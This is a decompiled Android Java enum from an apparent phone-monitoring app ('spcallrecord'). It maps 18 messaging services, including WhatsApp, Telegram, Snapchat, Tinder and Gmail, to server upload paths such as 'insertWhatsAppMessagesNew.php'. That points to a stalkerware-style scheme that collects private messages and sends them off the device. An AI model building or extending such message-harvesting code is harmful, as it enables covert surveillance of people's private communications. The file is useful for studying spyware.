package com.yasoka.spcallrecord.recorder.call.a.c.e;

/* compiled from: InstantMessagingType */
public enum d {
    FACEBOOK {
        public String a() {
            return "socialNetwork/noRoot/insertFacebookMessages.php";
        }

        public String toString() {
            return "FACEBOOK";
        }
    },
    WHATSAPP {
        public String a() {
            return "socialNetwork/noRoot/insertWhatsAppMessagesNew.php";
        }

        public String toString() {
            return "WHATSAPP";
        }
    },
    VIBER {
        public String a() {
            return "socialNetwork/noRoot/insertViberMessages.php";
        }

        public String toString() {
            return "VIBER";
        }
    },
    SKYPE {
        public String a() {
            return "socialNetwork/noRoot/insertSkypeMessages.php";
        }

        public String toString() {
            return "SKYPE";
        }
    },
    LINE {
        public String a() {
            return "socialNetwork/noRoot/insertLineMessages.php";
        }

        public String toString() {
            return "LINE";
        }
    },
    KIK {
        public String a() {
            return "socialNetwork/noRoot/insertKikMessages.php";
        }

        public String toString() {
            return "KIK";
        }
    },
    TANGO {
        public String a() {
            return "socialNetwork/noRoot/insertTangoMessages.php";
        }

        public String toString() {
            return "TANGO";
        }
    },
    HANGOUTS {
        public String a() {
            return "socialNetwork/noRoot/insertHangoutsMessages.php";
        }

        public String toString() {
            return "HANGOUTS";
        }
    },
    TELEGRAM {
        public String a() {
            return "socialNetwork/noRoot/insertTelegramMessages.php";
        }

        public String toString() {
            return "TELEGRAM";
        }
    },
    WECHAT {
        public String a() {
            return "socialNetwork/noRoot/insertWechatMessages.php";
        }

        public String toString() {
            return "WECHAT";
        }
    },
    SNAPCHAT {
        public String a() {
            return "socialNetwork/noRoot/insertSnapchatMessages.php";
        }

        public String toString() {
            return "SNAPCHAT";
        }
    },
    TINDER {
        public String a() {
            return "socialNetwork/noRoot/insertTinderMessages.php";
        }

        public String toString() {
            return "TINDER";
        }
    },
    HIKE {
        public String a() {
            return "socialNetwork/noRoot/insertHikeMessages.php";
        }

        public String toString() {
            return "HIKE";
        }
    },
    INSTAGRAM {
        public String a() {
            return "socialNetwork/noRoot/insertInstagramMessages.php";
        }

        public String toString() {
            return "INSTAGRAM";
        }
    },
    TWITTER {
        public String a() {
            return "socialNetwork/noRoot/insertTwitterMessages.php";
        }

        public String toString() {
            return "TWITTER";
        }
    },
    GMAIL {
        public String a() {
            return "socialNetwork/noRoot/insertGmailMessages.php";
        }

        public String toString() {
            return "GMAIL";
        }
    },
    IMO {
        public String a() {
            return "socialNetwork/noRoot/insertImoMessages.php";
        }

        public String toString() {
            return "IMO";
        }
    },
    YOUTUBE {
        public String a() {
            return "socialNetwork/noRoot/insertYoutubeHistory.php";
        }

        public String toString() {
            return "YOUTUBE";
        }
    };

    public abstract String a();

    public abstract String toString();
}
